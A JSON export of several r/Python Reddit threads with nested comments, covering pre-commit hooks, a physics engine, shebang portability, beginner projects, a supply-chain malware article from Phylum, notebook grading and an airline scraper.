            "content": "Is there any difference between python regex and regex regex? Also, you are a brave soul lol. I do not envy you.",
            "replies": [
                {
                    "author": "code_x_7777",
                    "score": "3",
                    "content": "Haha, thanks. I'm just a nerd - no bravery. There's no universally accepted regex regex standard. Python has its own slight variations and interpretations. But it's very similar to other languages regex flavors - if you understand one, you understand most."
                }
            ]
        },
        {
            "author": "JamzTyson",
            "score": "3",
            "content": "In our humble opinion, we rate regexes as the second most important skill to learn, right after basic typing skills. LoL"
        },
        {
            "author": "JacobD393",
            "score": "2",
            "content": "That's gonna be one hell of a book. I'm currently filling that gap in my knowledge but Regex still looks like hieroglyphics to me. Thanks a lot!"
        },
        {
            "author": "alcalde",
            "score": "2",
            "content": "Just the table of contents alone is enough to make me never want to learn regular expressions. They're unpythonic AND unhuman. But congratulations on completing a book on regex with your sanity intact!"
        },
        {
            "author": "fenghuangshan",
            "score": "2",
            "content": "very good resource, thanks"
        }
    ]
},
{
    "post_author": "LatterConcentrate6",
    "post_id": "1cc9wtr",
    "post_score": "118",
    "post_time": "Thursday, April 25, 2024 at 12:17:23 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What are your favourite pre-commit hooks and why?",
    "media": [],
    "post_content": "Just getting started with pre-commit and I think it's awesome. Looking to find out what other code automation tools people are using. Let me know what works for you and why. Thanks!",
    "comments": [
        {
            "author": "Grintor",
            "score": "53",
            "content": "You may fancy me mad, but this is my standard python pre-commit stack: end-of-file-fixer trailing-whitespace fix-byte-order-marker mixed-line-ending name-tests-test no-commit-to-branch autoflake args: [ \"--in-place\", \"--remove-unused-variables\", \"--remove-all-unused-imports\" ] isort black cspell doc8 args: [ \"--max-line-length\", \"112\", \"--file-encoding\", \"utf-8\" ] flake8 additional_dependencies: [ flake8-pytest-style, flake8-bugbear, flake8-comprehensions, flake8-print, darglint ] bandit pylint",
            "replies": [
                {
                    "author": "rrrriddikulus",
                    "score": "16",
                    "content": "protip - rewrite half of these to use ruff rules and save like 20s on each commit",
                    "replies": [
                        {
                            "author": "Grintor",
                            "score": "3",
                            "content": "Yeah, ruff wasn't around when I made this, looking at it now I can see it can probably replace more that half the things here",
                            "replies": [
                                {
                                    "author": "Shay-Hill",
                                    "score": "2",
                                    "content": "The only caution is that I have not found a way to limit autofixers on Ruff. It seems to be all or nothing. I keep black and isort separate, because I don’t want to autofix things like commented-out code (which is often misidentified)."
                                }
                            ]
                        },
                        {
                            "author": "russellvt",
                            "score": "0",
                            "content": "Egads ... I might actually have to finay look at ruff ... providing I can get rust to play nice on the needed platforms. Or, maybe I go all ADHD on it and completely rearchitect my local repositories - and yes, I still largely use mercurial ... I'm \"that guy\"! (HaHaHa!)",
                            "replies": [
                                {
                                    "author": "ThePrimitiveSword",
                                    "score": "1",
                                    "content": "pip install ruff"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "EternityForest",
            "score": "46",
            "content": "ruff and ruff format, forbid-tabs, yelp's detect secrets. I don't do any heavier linting just for performance reasons, I already have pyright running in VSCode all the time."
        },
        {
            "author": "The_Bundaberg_Joey",
            "score": "64",
            "content": "black Particularly useful on projects with multiple collaborators because everyone’s code will be formatted identically.",
            "replies": [
                {
                    "author": "WallyMetropolis",
                    "score": "74",
                    "content": "I used and loved black for years. But now I'm all in on ruff."
                }
            ]
        },
        {
            "author": "dabdada",
            "score": "9",
            "content": "ruff, end-of-file-fixer, codespell"
        },
        {
            "author": "antshatepants",
            "score": "7",
            "content": "I wrote one that takes the .env (which I keep out of version control with .gitignore) and writes a .env.example with just the variable names"
        },
        {
            "author": "patrickkidger",
            "score": "17",
            "content": "ruff, ruff-format, pyright. You can add others too but those are the most important. Steal my config if you like: https://github.com/patrick-kidger/equinox/blob/main/.pre-commit-config.yaml"
        },
        {
            "author": "KingAristocrat",
            "score": "11",
            "content": "I’m surprised by the lack of mypy in these lists. I don’t know how people can work on large repos with many other developer WITHOUT static typing to some degree?"
        }
    ]
},
{
    "post_author": "More-Tower9993",
    "post_id": "1cemmxv",
    "post_score": "62",
    "post_time": "Saturday, April 27, 2024 at 10:24:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Pure Python Physics Engine",
    "media": [
        "https://github.com/levi2234/PhysEng"
    ],
    "post_content": "What My Project Does The Physics Engine Called PhysEng, provides an easy to use environment and visualization combo in which to try out different physics or even provide a template to design your own accelleration/velocity fields. Besides the visualization aspect and numpy the basic functions of the Engine are written completely in 100% python. The features included in the Engine are:\nParticles, Soft Bodies, Anchor points\nBuilt in Fields: Drag, Uniform Force Fields, Gravity Between Particles, Octree Gravity etc\nMake your own: There are standard templates included in the Examples to design your own fields\nSprings - Construct Soft Bodies using Springs. (Built in soft bodies: Cloth and ball\nTarget Audience PhysEng is made for people who just want to try out different simple simulations or want to design their own physics.\nComparison Looking through github I could never really find a simple and easy-to-use library that did not require me to install some weird libraries or that felt like it was hiding some process from me through using packages. This package is a solution to this since everything is written in python nothing is a secret and can be directed easily.\nGet PhysEng There is full documentation available in the Github repo: https://github.com/levi2234/PhysEng",
    "comments": [
        {
            "author": "marr75",
            "score": "36",
            "content": "I don't know about \"pure python\", as luckily you depend on numpy. Oddly enough, despite not being pure python, there are a lot of for loops through code that could be vectorized. There's also many unimplemented methods. This is a fun first outing at physics coding but I would encourage you to keep learning from other libraries. At a high level, the classes provided are facades that don't add a ton of value to the shallow methods below. You might consider looking up (or working with Copilot/ChatGPT) vectorizing larger operations to efficiently simulate physics systems. Vectorization will take advantage of memory optimizations and use SIMD CPU instructions (calculating whole blocks at a time instead of individual FP calculations). Really powerful would be if you could translate between easy to use object oriented python interfaces and data oriented vectorized operations. If you want to write low level, readable physics code that is optimized enough for real world use, consider Rust (which then you could create python interfaces for).",
            "replies": [
                {
                    "author": "More-Tower9993",
                    "score": "-21",
                    "content": "",
                    "replies": [
                        {
                            "author": "marr75",
                            "score": "40",
                            "content": "Then base python has no meaning. Numpy is not a part of the standard library and is instead an extensive wrapper around BLAS and LAPACK.",
                            "replies": [
                                {
                                    "author": "jonnyman9",
                                    "score": "4",
                                    "content": "Totally agree. This post should instead read “A Python Physics Engine” Also the GitHub is confusing because it claims 95% Python and then the Readme says 100%. Also how did you calculate 95%? Are you including the number of lines of NumPy you are calling? If my python script has 2 lines; one line is a print statement and the other line calls out to a c/c++ or rust library I wrote that is 100 lines of code, can I say that my app is 50% pure python?"
                                }
                            ]
                        },
                        {
                            "author": "VengefulTofu",
                            "score": "11",
                            "content": "When I did my engineering master's we did an exercise programming a finite element algorithm in pure python. Afterwards we implemented the same problem using numpy. This is where I learned to never ever use python for any calculations more complex than i+=1"
                        }
                    ]
                }
            ]
        },
        {
            "author": "SJDidge",
            "score": "3",
            "content": "Add some docstrings the classes and methods bruh",
            "replies": [
                {
                    "author": "More-Tower9993",
                    "score": "1",
                    "content": "Good point! Ill add them tomorrow!"
                }
            ]
        },
        {
            "author": "dr_exercise",
            "score": "2",
            "content": "Why do you require an input parameter but not set it? You also silently fail changes to class attributes/properties. Your users will be confused why the code appears to not work without any message or exception. The name mangling of these attributes is not necessary and can be abstracted away easily as it’s only package metadata. Others mentioned good points for the underlying algorithms and developer/end-user documentation. A lot of work left to really make this adoptable by others.",
            "replies": [
                {
                    "author": "More-Tower9993",
                    "score": "1",
                    "content": "Thanks for the feedback! There indeed is some polishing to do! Ill get onto that the coming days! Its still a work in progress✨"
                }
            ]
        },
        {
            "author": "not_perfect_yet",
            "score": "2",
            "content": "Cool project! If I would give some critique, without any expectation that you actually do this, I would say: This is \"useless\" to me because the ffmpeg and matplot and imageio seems to be mandatory? Idk. Not \"useless\" useless because I could still do what you do with it, but I don't really want to. What I want is a system where rendering is optional. To do other things with it the data. Maybe pick my own renderer or not render anything. So, can you maybe think about isolating the display part from the calculation part? If you want to tinker with it more, that would be an interesting thing to explore. But still, regardless, cool project! Keep going!",
            "replies": [
                {
                    "author": "More-Tower9993",
                    "score": "2",
                    "content": "Hey thanks for the comment! There is a way to circumvent using those libraries by only importing PhysEng.environment. However, if you do want the benefit of visualising using pygame without having to use matplotlib or ffmeg I can make some adjustments today or tomorrow! Update: The render option is disabled by default and libraries are only imported when enabling the rendering by giving the visualize class an argument of \"visualize(enable_rendering=True)\" Somewhere the coming days the numpy dependency will also be removed to satisfy the people who don't like that I used numpy. ;)"
                }
            ]
        },
        {
            "author": "pppylonnn",
            "score": "1",
            "content": "Should have called it Pysics 🤣"
        }
    ]
},
{
    "post_author": "tedkotz",
    "post_id": "1celpzi",
    "post_score": "4",
    "post_time": "Saturday, April 27, 2024 at 9:44:43 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Cross platform python3 shebang",
    "media": [],
    "post_content": "There is no shebang line that actually works across platforms for python 3.\nI would like one that works on unmodified :\nDebian shell (Dropped python2, falls under PEP 394)\nOlder Linux shells that still have python pointing to python2 (PEP 394)\nWindows cmd.exe shell (this really just means one that will work with PEP 397)\nGitbash for Windows (sort of a weird half sibling that respects shebangs)\nThe best work around I have found is:\nuse #!/usr/bin/env python3\non Windows copy python.exe to python3.exe\nThen make sure both are in your path for unix-like shells.\nDebian make sure python-is-python2 or python-is-python3 is installed, in case you come upon a #!/usr/bin/env python.\nAs Windows adopts more and more Unix-like behavior, and more distros drop python2, having completely different \"portability\" rules is going to become a larger problem.\nA significant compatibility enhancement would be if the official python packages for Windows just included a python3.exe to comply with PEP 394. This could be a copy of python.exe like my workaround, or one could be a minimal executable that just hands off to the other or to py.\nAn alternative would be adding py and pyw from PEP 397 to PEP 394. and having people move to the shebang #!/usr/bin/env py -3.\nThe belt and suspenders compatibility approach is all platforms should have a py, pyw, and python3 executable that can launch python3 scripts if requested. And python should be an executable than runs some version of python.\nI am curious what others are using out there? Do others launch python scripts from inside gitbash? do you have a seperate window for running the script and git actions? Are you manually choosing the python executable on the command line?",
    "comments": [
        {
            "author": "Muhznit",
            "score": "9",
            "content": "How old is the windows system you're using gitbash on? Modern windows have Windows Subsystem for Linux (WSL) and you can run most scripts with #!/usr/bin/env python3. It can even run the windows-installed version of python with a shebang of #!/usr/bin/env /mnt/c/Users/Muhznit/AppData/Local/Microsoft/WindowsApps/python.exe or similar.",
            "replies": [
                {
                    "author": "tedkotz",
                    "score": "-1",
                    "content": "Some of the systems certainly aren't new, usually Windows 10. They certainly aren't running WSL or anything else that installs a python3 executable in their path. I guess my point is it would be nice if the python.org python installer did put a python3 exectuable in the path."
                }
            ]
        },
        {
            "author": "mgedmin",
            "score": "1",
            "content": "#!/usr/bin/env py -3 The thing about shebang lines on Unix is that they allow one (1) command-line argument, so this runs /usr/bin/env \"py -3\". GNU env has a hack where you can use #!/usr/bin/env -S py -3, and the kernel will run /usr/bin/env \"-S py -3\", but env itself will see the -S and split the remainder on spaces into separate arguments. I'm not sure how portable this is."
        }
    ]
},
{
    "post_author": "StoneSteel_1",
    "post_id": "1ccy7j3",
    "post_score": "2",
    "post_time": "Thursday, April 25, 2024 at 9:14:08 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Sensor-App: A Sensor Data Displaying/Streaming Android App written in Python",
    "media": [
        "https://github.com/StoneSteel27/SensorApp"
    ],
    "post_content": "Sensor-App is an Android App that's main focus is to help create a real-time mobile sensor data stream for computer applications, data collection, AR, VR, etc.\nGithub: SensorApp\nFeatures of Sensor-App\nReal-Time Sensor Data display\nFaster Real-Time Sensor Data Streaming via TCP Sockets\nSimple and Easy setup of Data Streaming Server\nWhat my Project Does\nMy project is aimed to help provide a Real-Time Mobile Sensor data streaming service.\nTarget Audience\nComputer Programmers, Data Scientists, AR and VR enthusiasts\nRemarks\nThis Application was made with help of Beeware Tools.\nI made this Application to test out abilities of Beeware Tools, and get Experience in Android App develpoment with python\nCurrently the Project only contains Accelerometer, and I will update it soon to support other sensors too.\nI am always open hear advice, constructive criticism about my project.\nI would like to hear your opinion of my project :}\nThanks for Reading, hope you try out my project :)",
    "comments": []
},
{
    "post_author": "justKoda69",
    "post_id": "gkhjzt",
    "post_score": "1979",
    "post_time": "Saturday, May 16, 2020 at 12:07:49 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "This morning I decided to learn how to code in Python and after watching a YouTube course on the basics of the language, I coded this all by myself. It took me like 4 or 5 hours. I feel ashamed and super proud at the same time.",
    "media": [
        "https://i.redd.it/qi44qd0duzy41.png",
        "https://preview.redd.it/qi44qd0duzy41.png?width=640&crop=smart&auto=webp&s=c16965d48e9a204c94df8abe3bcb162541460c8d"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "MutatedJerkey",
            "score": "397",
            "content": "Looks like you're off to a great start. By the way, you can put a string as the argument for input() to print a prompt, rather than having a separate print statement before. For example: firstname = input(\"Enter your first name. \")",
            "replies": [
                {
                    "author": "justKoda69",
                    "score": "220",
                    "content": "Thank you very much! I love when people correct me when I'm wrong and I love it even more when they tell me how to do something in a more efficient way. 🤗",
                    "replies": [
                        {
                            "author": "HackySac",
                            "score": "98",
                            "content": "You're not wrong, as someone who has been learning over the past few months, I've learned it's best to know the long way to do something first as it helps with muscle memory, and second once you see it broken down to 3 lines it's easier when you know what those 3 lines are doing if you know it broken down. So you're not wrong, but you did just learn something new, so you made progress!"
                        },
                        {
                            "author": "Eheroduelist",
                            "score": "43",
                            "content": "It’s a nice bit of code! If I can make one suggestion, the “Y/N” tool will miss a lower case y/n, so you can use a .capitalize() function on the string input to fix for that It’s also best practice to trim leading and trailing spaces with .strip() answer1 = input(“Please enter Y/N: “).strip().capitalize()"
                        },
                        {
                            "author": "PinwheelFlowers",
                            "score": "3",
                            "content": "That’s the attitude! If you can keep that up you’ll be gold."
                        },
                        {
                            "author": "[deleted]",
                            "score": "3",
                            "content": "Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those!"
                        },
                        {
                            "author": "daxxog",
                            "score": "2",
                            "content": "import this"
                        }
                    ]
                },
                {
                    "author": "curohn",
                    "score": "6",
                    "content": "TIL."
                }
            ]
        },
        {
            "author": "TravisJungroth",
            "score": "95",
            "content": "You definitely reached for the right tool when you decided to use a while loop. That's good for this case of \"do this until something happens\". You could use True and False instead of 1 and 0 for your while loop variables. Then you could do something like while not intro: Or just while intro if you invert the logic (start it True and make it False). You could actually do that now, since 0 evaluates to false in Python and other numbers to true."
        },
        {
            "author": "lajoh20",
            "score": "219",
            "content": "Nice job if anyone starts talking to you about JavaScript run away Welcome to the snake cult one of us one of us one of us"
        },
        {
            "author": "AbodFTW",
            "score": "84",
            "content": "Considering you just started that's actually very good, the first week I started programming I was only able to create a hello world app, so good job!"
        },
        {
            "author": "[deleted]",
            "score": "54",
            "content": "Props for using f strings"
        },
        {
            "author": "[deleted]",
            "score": "33",
            "content": "Loops took me weeks when I first started. Now I develop python apps professionally at a well known tech company in SF. Stay at it, you'll go very far."
        },
        {
            "author": "james41235",
            "score": "14",
            "content": "Congratulations! You should never feel ashamed at completing something! I'm in my 30s and have been working for >10 years and still stop and cheer when I get something correct."
        },
        {
            "author": "--0mn1-Qr330005--",
            "score": "11",
            "content": "Great job! It is a simple first script, but that's not the first thing I see. I see a first script that is clean and easy to read, which is an amazing habit to form from the start, and your future coworkers/collaborators will love you for it. If you are interested in having readable code, check out pep8 once you are more comfortable with python. It is basically a list of rules a lot of coders adhere to which results in a clean and easy to read project, and standardizes things like variable/class names, and code spacing, and is pretty close to the way you write your code already. There's probably videos on YouTube summarizing it in just a few minutes, since it is a pretty easy standard to adhere to."
        },
        {
            "author": "thrallsius",
            "score": "11",
            "content": "best time to stop showing code as screenshot and use a pastebin instead, before it becomes a bad habit"
        }
    ]
},
{
    "post_author": "louis11",
    "post_id": "1cgw1y2",
    "post_score": "0",
    "post_time": "Tuesday, April 30, 2024 at 6:45:02 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How Malicious Python Code Gains Execution",
    "media": [
        "https://blog.phylum.io/how-malicious-python-code-gains-execution/"
    ],
    "post_content": "The primary vector for malicious code running in software developer environments (e.g., local system, CI/CD runners, production servers, etc.) is software dependencies. This is third-party code which often means open-source software, also known as running code from strangers on the internet.\nThe prized goal for attackers is arbitrary code execution. It’s the stuff high CVE scores are made of and often the topic of how vulnerabilities can turn into exploits. It’s the foothold needed to run cryptominers, steal secrets, or encrypt data for ransom. It’s no wonder why threat actors want it, but how do they get it? Sutton’s Law makes it obvious why they go after open-source software: because executing arbitrary code is easy there.\nThis is a series examining the methods malicious Python code gains execution. Some of the methods are obvious and some are potentially undiscovered or at least not found in the wild, yet. What they all mostly have in common is the reliance on a software dependency in the form of a Python package, which is where we begin.\nhttps://blog.phylum.io/how-malicious-python-code-gains-execution/",
    "comments": [
        {
            "author": "BostonBaggins",
            "score": "4",
            "content": "Ok reddit give.me the dumbed down version",
            "replies": [
                {
                    "author": "dparks71",
                    "score": "8",
                    "content": "Don't use random pypi packages, they're dangerous and you can't trust them, unless of course it's our pypi package, which you can get via pip install phylum. It's in beta, but you should plug it into all your CI/CD pipelines and environment builds cause bad guys typosquat and release malicious packages.",
                    "replies": [
                        {
                            "author": "russellvt",
                            "score": "5",
                            "content": "\"Don't trust random Python modules, as they can lead to exploits - but trust us.\" Got it.",
                            "replies": [
                                {
                                    "author": "louis11",
                                    "score": "4",
                                    "content": "I'm one of the co-founders @ Phylum. I can assure you we're doing our best to help clean up open source. We work closely with PyPI and the PSF, reporting malware on PyPI nearly daily; we're also supporting the effort around the API to report and triage malware in the Python ecosystem (a PyPI initiative). We've also reported on multiple broad campaigns by nation states, with callouts from Github directly. We've identified and reported on campaigns targeting Rust (with thanks from The Rust Foundation), npm, Nuget, etc. I say all this to say: trust shouldn't necessarily be given by default, but we are honestly trying to make things better."
                                }
                            ]
                        },
                        {
                            "author": "Consistent-Quiet6701",
                            "score": "1",
                            "content": "What the hell does it do? The repo states what it is but not it's purpose.",
                            "replies": [
                                {
                                    "author": "louis11",
                                    "score": "4",
                                    "content": "Phylum scans seven open source package repositories for indications of supply chain attacks (e.g., malware). We provide tooling to detect these attacks in CI and on developer workstations. The phylum CLI leverages our open source sandbox for package installations. So phylum pip install <pkg> will disallow pip from accessing things you haven't explicitly allowed in the TOML file."
                                }
                            ]
                        },
                        {
                            "author": "BostonBaggins",
                            "score": "1",
                            "content": "I use snyk extension in vs code Is that enough ?",
                            "replies": [
                                {
                                    "author": "louis11",
                                    "score": "1",
                                    "content": "Snyk doesn't scan for malware packages. They have a known vulnerablity database, but minimal insight into unknown (or previously unreported) threats."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1ccmzr8",
    "post_score": "6",
    "post_time": "Thursday, April 25, 2024 at 11:44:06 AM GMT+3",
    "flair_text": "News",
    "post_title": "UXsim 1.2.0 released with support for (self-driving) taxis and shared mobility",
    "media": [
        "https://github.com/toruseo/UXsim/releases/tag/v1.2.0",
        "https://github.com/toruseo/UXsim"
    ],
    "post_content": "Version 1.2.0 of UXsim is released, which allows simulating taxis, shared mobility and self-driving taxis!\nMain Changes in 1.2.0\nAdd taxi (aka. shared mobility) functions\nA standard vehicle in UXsim just travel from A to B and disappear. This is like a private owned vehicle.\nFrom this update, a Vehicle with mode=\"taxi\" behave like a taxi. Specifically, they travel through a network by passing through specific nodes that are dynamically updated, simulating passenger pickup and drop-off.\nNew sub-module uxsim.TaxiHandler handles these matters.\nBuilt-in vehicle-to-passneger matching methods are also available.\nThis addresses Issue #41\nFrom now on, we follow the Semantic Versioning rigorously.\nUXsim\nUXsim is a free, open-source macroscopic and mesoscopic network traffic flow simulator written in Python. It simulates the movements of car travelers and traffic congestion in road networks. It is suitable for simulating large-scale (e.g., city-scale) traffic phenomena. UXsim is especially useful for scientific and educational purposes because of its simple, lightweight, and customizable features, but users are free to use UXsim for any purpose.",
    "comments": [
        {
            "author": "sub-_-dude",
            "score": "1",
            "content": "Ngl, this is one of the coolest projects I've ever heard of."
        }
    ]
},
{
    "post_author": "OpenSourcerer420",
    "post_id": "gfkuez",
    "post_score": "1908",
    "post_time": "Friday, May 8, 2020 at 5:42:05 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "My first Python program! Changes my desktop background based on the weather, time, and day.",
    "media": [
        "https://i.redd.it/8fskn6exegx41.png",
        "https://preview.redd.it/8fskn6exegx41.png?width=640&crop=smart&auto=webp&s=dccb098766cddf2afbbe72ab30f3952146165da9"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Gautam-j",
            "score": "229",
            "content": "You probably shouldn't keep your API key public. :)",
            "replies": [
                {
                    "author": "OpenSourcerer420",
                    "score": "106",
                    "content": "yikes, I'm changing it now",
                    "replies": [
                        {
                            "author": "Turkino",
                            "score": "76",
                            "content": "Yep! Welcome to configuring environment variables!"
                        }
                    ]
                },
                {
                    "author": "DrCabbageX",
                    "score": "23",
                    "content": "What does the api key do?(new to python)",
                    "replies": [
                        {
                            "author": "speedstyle",
                            "score": "73",
                            "content": "It's not actually anything specific to python. The weather website he's using needs some kind of login, to prevent people from spamming it and charge people who want to use it lots. To make the interface simple, it uses a 'key' in the URL (which you can see in api_address in the code). So he's left his 'login' to the weather website in the code."
                        },
                        {
                            "author": "Gautam-j",
                            "score": "20",
                            "content": "It isn't related to Python. Think of API key as your password to log in to a website. It's a way to interact, make requests to a website. In this case, OP uses his API to communicate with the openweather website to get weather details. You might want to look into API in depth."
                        },
                        {
                            "author": "OnCr4k",
                            "score": "4",
                            "content": "It has nothing to do with python, but the web API he's using likely has some kind of quota per API key, so making it public means others could use it up"
                        },
                        {
                            "author": "garlic_bread_thief",
                            "score": "3",
                            "content": "It's like a unique password for everybody to be able to get access to the API."
                        }
                    ]
                },
                {
                    "author": "roboduck34",
                    "score": "-8",
                    "content": "",
                    "replies": [
                        {
                            "author": "DougScore",
                            "score": "20",
                            "content": "You don't keep your reddit password in plain text for world to see, right ? It's just that."
                        },
                        {
                            "author": "CloroxEnergyDrink_",
                            "score": "7",
                            "content": "Not really but if you let everyone use your API key then you could get limited or even blocked due to high request rates. Best to treat it like a password, meaning never ever share it with anyone, unless it’s for special occasions."
                        }
                    ]
                }
            ]
        },
        {
            "author": "romulofff",
            "score": "61",
            "content": "Hey, that’s really nice! Would you mind sharing the code? Do you have any public repository with it? Congratulations"
        },
        {
            "author": "Wing-Tsit_Chong",
            "score": "86",
            "content": "Don't use recursion, if you want to loop. Rather do a while true loop. There's a limit to how many times you can recurse down, i.e. call main() inside itself. If you reach it, the program will fail. You can test that by removing the sleeps and running your program, it will fail after 1001 \"Looped\"."
        },
        {
            "author": "Meshi26",
            "score": "35",
            "content": "Congrats on your first successful program! I hope you don't mind some constructive criticism? Usually in coding if you see yourself typing the same thing everytime, then there's a shorter way to do it. What I'm talking about is the setting the wallpaper and sleeping after checking the weather type. Since you're using a 1-to-1 reference of \"weather type\" to \"background.png\" you could instead store these values in a dictionary and just have a single loop that checks every 120 seconds and looks up the value in the dictionary. It would reduce your code from 4 (or more if the file keeps going) sections to just 1 :)"
        },
        {
            "author": "[deleted]",
            "score": "10",
            "content": "A suggestion to improve the code: Create a function called something like change_wallpaper(), where it takes in the path as a string argument and calls the ctypes method. This way you don't have to constantly repeat SPI_SETDESKWALLPAPER throughout your code."
        },
        {
            "author": "BoaVersusPython",
            "score": "9",
            "content": "This is 100% something i'm going to copy"
        },
        {
            "author": "americk0",
            "score": "14",
            "content": "Nice! I'm not very fluent with python but don't you need double backslashes in the strings? I thought backslash would act as an escape character"
        },
        {
            "author": "garlic_bread_thief",
            "score": "6",
            "content": "How do you keep the program running all the time?"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "Cool!"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "This is good, but more than that, I like the editor theme :P Also, you can pass the image names and all to another function and sort of reduce+automate the coding process a bit (no need to tho, because this is simple script). If you're interested in scripting useful stuff, pm."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cgem9q",
    "post_score": "3",
    "post_time": "Tuesday, April 30, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Child_immigration",
            "score": "1",
            "content": "Fee foom"
        },
        {
            "author": "gotsomequestionss",
            "score": "1",
            "content": "How does pip/python decide where to install the packages? Trying to understand the logic that decides the location to install packages for a virtual environment. What environment variables/other logic does it use to determine the location of installed packages?"
        }
    ]
},
{
    "post_author": "flying_Wahale",
    "post_id": "1cbxubs",
    "post_score": "68",
    "post_time": "Wednesday, April 24, 2024 at 4:12:22 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Best way to grade Jupyter-Notebooks?",
    "media": [],
    "post_content": "I recently took a job with a professor, that includes helping with the grading of biweekly assignments. So I basically have now 30 Notebooks that I have to grade. Top of my head I can think of these approaches:\nConvert to PDF and write into the PDF\nDuplicate the Notebook and write the comments in extra blocks\nCreate a .txt file with all my note\nDoes anybody have experience with this and can share their workflow?",
    "comments": [
        {
            "author": "Almostasleeprightnow",
            "score": "71",
            "content": "I vote for 2, because then the notes can go right in the correct spot. You can come up with a call sign, which you put at the beginning of each comment, like, “GRADING NOTE: “",
            "replies": [
                {
                    "author": "PerAsperaDaAstra",
                    "score": "29",
                    "content": "I use alert box <div>s for this and it works pretty well. (Edit - Something similar is possible with admonitions too and has a nicer syntax depending on where you want to render things)"
                }
            ]
        },
        {
            "author": "chrissy__",
            "score": "38",
            "content": "My professor already had cells for grading in the original file and then just added his notes before handing the file back to us. Saves you from making too many changes 30 times, just quickly jotting down notes suffices."
        },
        {
            "author": "QueasyEntrance6269",
            "score": "24",
            "content": "jupyter notebooks are just json. you can programatically modify it. write a script that tags grade -> cell number and run it, outputting a new jupyter notebook? https://ipython.org/ipython-doc/dev/notebook/nbformat.html, here's the canonical library https://nbformat.readthedocs.io/en/latest/index.html",
            "replies": [
                {
                    "author": "HistoricalCup6480",
                    "score": "20",
                    "content": "Honestly, manually grading 30 notebooks doesn't take long enough to justify automation. Option 2 of OP is fine. That's what I usually did, and my students liked it."
                }
            ]
        },
        {
            "author": "Spadanttu",
            "score": "8",
            "content": "A lot of good answers here for your current situation, so look into those. For any future assignments of this sort I would suggest looking into nbgrader, as it allows for the creation of automatically graded assignments in notebook format."
        },
        {
            "author": "krypt3c",
            "score": "6",
            "content": "I would just use an off the shelf autograder. This might work for you? https://nbgrader.readthedocs.io/en/stable/"
        },
        {
            "author": "trollsmurf",
            "score": "7",
            "content": "Never been a teacher / grader, but... 2 sounds best for continuity, as the code can still run. Define a consistent format for those comments so they can be searched for."
        },
        {
            "author": "marr75",
            "score": "3",
            "content": "Jupytext can convert to and from a lot of formats including plain ol python. If the assignment is set up for it, you could convert them and test the code. You could also have AI take a first pass at grading (especially in python or markdown format) then double check (you should assume it will make mistakes)."
        },
        {
            "author": "throwaway37559381",
            "score": "2",
            "content": "You could possibly use a chrome extension like Tango and click and it will grab the screnshot and then you can add notes to that and then export as a google doc"
        }
    ]
},
{
    "post_author": "JohnBalvin",
    "post_id": "1ce1qi4",
    "post_score": "65",
    "post_time": "Saturday, April 27, 2024 at 3:54:37 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "American Airlines scraper made in Python with only http requests",
    "media": [
        "https://github.com/johnbalvin/pyaair"
    ],
    "post_content": "Hello wonderful community,\nToday I'll present to you pyaair, a scraper made pure on Python https://github.com/johnbalvin/pyaair\nEasy instalation\n` ` `pip install pyaair ` ` `\nEasy Usage\n` ` ` airports=pyaair.airports(\"miami\",\"\") ` ` `\nAlways remember, only use selenium, puppeteer, playwright etc when it's strictly necesary\nLet me know what you think,\nthanks\nAbout me:\nI'm full stack developer specialized on web scraping and backend, with 6-7 years of experience",
    "comments": [
        {
            "author": "blackbrandt",
            "score": "96",
            "content": "6-7 years experience doesn’t use context manager to open/close files",
            "replies": [
                {
                    "author": "ElHeim",
                    "score": "43",
                    "content": "To be fair, they never said anything about having 6-7 years experience in Python!"
                },
                {
                    "author": "JohnBalvin",
                    "score": "22",
                    "content": "I'm a Go developer, I don't use much python, sorry if I made mistakes on the code.",
                    "replies": [
                        {
                            "author": "blackbrandt",
                            "score": "37",
                            "content": "All good, I’m being a bit snarky. Just so you know, Python has context managers that handle file IO really nicely. with open(“file.txt”, “r”) as f: data = f.read() Is the same as f = open(“file.txt”, “r”) data = f.read() f.close()",
                            "replies": [
                                {
                                    "author": "theQuick_BrownFox",
                                    "score": "4",
                                    "content": "Newbie here. Whats the advantage of the bottom one?"
                                }
                            ]
                        },
                        {
                            "author": "thisismyfavoritename",
                            "score": "-3",
                            "content": "why not write this thing in go?",
                            "replies": [
                                {
                                    "author": "JohnBalvin",
                                    "score": "8",
                                    "content": "There is a go version also"
                                },
                                {
                                    "author": "nichady01",
                                    "score": "1",
                                    "content": "He did, check his profile."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "pkammuh",
            "score": "3",
            "content": ""
        },
        {
            "author": "EatThemAllOrNot",
            "score": "3",
            "content": "Nice, but would be great to have async option (see httpx package). Also, please use linter (ruff is the best for Python)."
        },
        {
            "author": "divino-moteca",
            "score": "2",
            "content": "Nice."
        },
        {
            "author": "AlexMTBDude",
            "score": "2",
            "content": "If you run your code through Pylint, or any other static code checker, what kind of score do you get? How many warnings? (Hint: A LOT!) It's pretty badly written Python code.",
            "replies": [
